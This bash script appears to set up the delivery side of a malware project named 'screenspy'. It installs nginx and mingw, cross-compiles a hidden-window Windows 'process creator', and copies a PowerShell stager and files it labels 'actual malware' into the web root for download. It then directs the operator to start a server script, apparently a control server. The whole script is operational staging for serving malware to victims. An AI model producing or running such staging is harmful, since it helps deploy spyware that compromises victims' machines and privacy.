#!/bin/bash

if [ "$EUID" -eq 0 ]; then
    
    echo "Installing required packages"
    apt install nginx python3 python3-venv python3-pil mingw-w64
    
    echo "Compiling process creator"
    x86_64-w64-mingw32-gcc runner.c -o runner.exe -mwindows
    echo "Sucessfully compiled process creator"


    echo "Installing pip packages"
    python3 -m venv venv
    source venv/bin/activate
    pip3 install -r requirements.txt


    echo "Copying stager script into webroot"
    cp stager.ps1 /var/www/html
    echo "Sucessfully copied"

    echo "Copying actual malware into webroot"
    cp runner.exe /var/www/html
    cp client.exe /var/www/html 2>/dev/null
    cp client     /var/www/html 2>/dev/null
    echo "Sucessfully copied"

    echo "Copying nginx config"
    cp nginx.conf /etc/nginx/conf.d/screenspy.conf
    echo "Successfully copied"

    echo "Everything is done restarting webserver"
    systemctl restart nginx

    echo "~~~ READY run: python3 server.py"

else
    echo "Please run script with \"sudo\" commnad"
fi



